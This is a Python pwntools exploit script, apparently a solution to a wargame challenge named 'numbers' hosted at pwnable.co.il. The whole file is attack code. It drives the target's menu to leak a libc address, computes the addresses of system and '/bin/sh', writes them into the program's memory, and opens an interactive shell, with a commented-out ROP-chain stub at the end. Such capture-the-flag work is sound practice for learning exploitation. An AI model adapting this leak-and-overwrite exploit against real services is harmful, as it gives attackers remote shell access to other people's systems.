from pwn import *

def leak_libc():
    data = p.recvuntil(">").decode()
    print(data)
    return int(data.split("\n")[0].split(": ")[1]) - 0x1adf0 - 0xf5

def printLine():
    print(p.recvuntil(">").decode())

#p = process('./numbers')
p = remote("pwnable.co.il", 9005)
printLine
p.sendline("3") # set new index
p.sendline("39") # index = 39
printLine()
p.sendline("1") # inc index (index = 40)
printLine()
p.sendline("4") # write unsigned numebr
printLine()
p.sendline("7677233") # index = 49 and string format ('%u')
printLine()
p.sendline("5") #leak libc
libc_base = leak_libc()
print("leak libc: ", hex(int(libc_base)) )
#4158496768
binsh = libc_base +  0x18e363
system = libc_base + 0x41790
p.sendline("4")
p.sendline(str(system))
for _ in range(9):
    p.sendline("2")
p.sendline("4") # write unsigned numebr
p.sendline("7677235") # index = 49 and string format ('%u')
p.sendline("4")
p.sendline(str(binsh))
print("binsh: ", hex(binsh))
p.sendline("6")
p.interactive()
#print("leak libc: ", hex(geyVal()))
"""
p.sendline("4") # write unsigned numebr (edit ret address)
p.sendline("1234") # new ret address (first gadget addr)
p.sendline("6") # start ropchain
p.recvall()
"""